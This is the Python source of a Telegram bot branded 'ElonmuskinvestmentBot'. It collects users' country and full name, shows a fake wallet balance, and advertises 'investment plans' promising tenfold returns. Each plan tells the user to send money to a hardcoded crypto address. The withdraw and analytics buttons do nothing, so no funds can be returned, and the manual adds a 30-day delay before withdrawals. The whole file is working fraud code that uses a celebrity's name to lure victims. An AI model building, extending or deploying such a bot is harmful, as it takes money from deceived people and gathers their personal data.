import telebot
from telebot import types
import pycountry
import json
import os
from datetime import datetime
from dotenv import load_dotenv

# --- CONFIGURATION ---
load_dotenv() 
API_TOKEN = os.getenv('API_TOKEN')
# CRITICAL: Replace 123456789 with your real Telegram User ID
ADMIN_ID = 6638267321

# Fixed: Variable names cannot have spaces
MY_TON_COIN = '0x58Ed91E903BbD23782A166f2434F85114A5e9594'
CHANGELY = 'https://changelly.com/'
DB_FILE = "bot_data.json"

bot = telebot.TeleBot(API_TOKEN)

# --- DATABASE LOGIC ---
def load_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"users": {}, "reports": []}
    return {"users": {}, "reports": []}

def save_data(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

db = load_data()

def get_user(uid):
    uid = str(uid)
    if uid not in db["users"]:
        db["users"][uid] = {
            "step": "start", "balance": 0.0, "name": "", 
            "pin": None, "linked": False, "investments": [], 
            "blocked": False, "method_type": None
        }
    return db["users"][uid]

def is_valid_country(text):
    for c in pycountry.countries:
        if text.lower() == c.name.lower(): return True
    return False

# --- MAIN MENU ---
def show_menu(chat_id, name, edit=False, message_id=None):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💳 Wallet", callback_data="main_wallet"),
        types.InlineKeyboardButton("📊 Dashboard", callback_data="main_dash"),
        types.InlineKeyboardButton("📉 Analytics", callback_data="main_anal"),
        types.InlineKeyboardButton("❔ Help", callback_data="main_help")
    )
    text = f"Welcome to **ElonmuskinvestmentBot**, {name}! 🚀"
    if edit and message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
def start(m):
    u = get_user(m.from_user.id)
    if u["blocked"]: return
    if u["step"] == "completed":
        bot.send_message(m.chat.id, "Welcome back! ⚡")
        show_menu(m.chat.id, u["name"])
    else:
        u["step"] = "awaiting_country"
        save_data(db)
        bot.send_message(m.chat.id, "Welcome! 👋\nPlease send your **Country Name** or **Flag** to verify.")

@bot.message_handler(commands=['admin'])
def admin_panel(m):
    # This now uses the ADMIN_ID variable defined above
    if m.from_user.id != ADMIN_ID:
        bot.reply_to(m, "❌ Access Denied. Admin only.")
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("Check Reports", callback_data="adm_reports"),
        types.InlineKeyboardButton("Control User", callback_data="adm_control")
    )
    bot.send_message(m.chat.id, "🛠 **Admin Panel**", reply_markup=markup)

# --- TEXT HANDLER ---
@bot.message_handler(func=lambda m: True)
def handle_text(m):
    uid = str(m.from_user.id)
    u = get_user(uid)
    if u["blocked"]: return

    if u["step"] == "awaiting_country":
        if is_valid_country(m.text):
            u["step"] = "awaiting_name"
            bot.reply_to(m, "✅ Verified! Now enter your **Full Name** (2+ words):")
        else: bot.reply_to(m, "❌ Invalid country name. Please try again.")
    
    elif u["step"] == "awaiting_name":
        if len(m.text.split()) >= 2:
            u["name"] = m.text
            u["step"] = "completed"
            show_menu(m.chat.id, m.text)
        else: bot.reply_to(m, "⚠️ Please enter a full name (minimum 2 words).")
    
    elif u["step"] == "filing_report":
        db["reports"].append({"id": uid, "msg": m.text})
        u["step"] = "completed"
        bot.send_message(m.chat.id, "✅ Your report has been sent to the admin.")
        bot.send_message(ADMIN_ID, f"🔔 **New Report from {uid}**:\n{m.text}")
        show_menu(m.chat.id, u["name"])

    save_data(db)

# --- CALLBACK HANDLER ---
@bot.callback_query_handler(func=lambda c: True)
def handle_callbacks(c):
    uid = str(c.from_user.id)
    u = get_user(uid)

    if c.data == "back_main":
        show_menu(c.message.chat.id, u["name"], edit=True, message_id=c.message.message_id)

    elif c.data == "main_wallet":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("Withdraw", callback_data="with_check"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text(f"💳 **Wallet Balance**\n\nTotal: `${u['balance']:,.2f}`", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "main_dash":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("$2,000 to get $20,000", callback_data="inv_2000"),
            types.InlineKeyboardButton("$5,000 to get $50,000", callback_data="inv_5000"),
            types.InlineKeyboardButton("$6,000 to get $60,000", callback_data="inv_6000"),
            types.InlineKeyboardButton("$10,000 to get $100,000", callback_data="inv_10000"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text("📈 **Investment Plans**\nSelect a plan to invest:", c.message.chat.id, c.message.message_id, reply_markup=markup)

    elif c.data.startswith("inv_"):
        amt = c.data.split("_")[1]
        # Fixed multi-line string and variable name
        msg = (f"📥 **Plan Selected: ${amt}**\n\n"
               f"To begin, copy the **TON Coin** address below and fund it.\n\n"
               f"TON Address:\n`{MY_TON_COIN}`\n\n"
               f"Exchange Link:\n{CHANGELY}")
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back to Dashboard", callback_data="main_dash"))
        bot.edit_message_text(msg, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "main_help":
        markup = types.InlineKeyboardMarkup(row_width=2).add(
            types.InlineKeyboardButton("Make a Report", callback_data="h_report"),
            types.InlineKeyboardButton("Read Manual", callback_data="h_manual"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text("How can we help you today?", c.message.chat.id, c.message.message_id, reply_markup=markup)

    elif c.data == "h_manual":
        manual = ("📘 **User Manual**\n\n"
                 "1. **Start**: Register with your country and name.\n"
                 "2. **Invest**: Choose a plan. Fund the TON address.\n"
                 "3. **Track**: Check 'Analytics' for growth.\n"
                 "4. **Withdraw**: Link your wallet/bank after 30 days.")
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="main_help"))
        bot.edit_message_text(manual, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    save_data(db)

print("ElonmuskinvestmentBot started...")
bot.infinity_polling()        
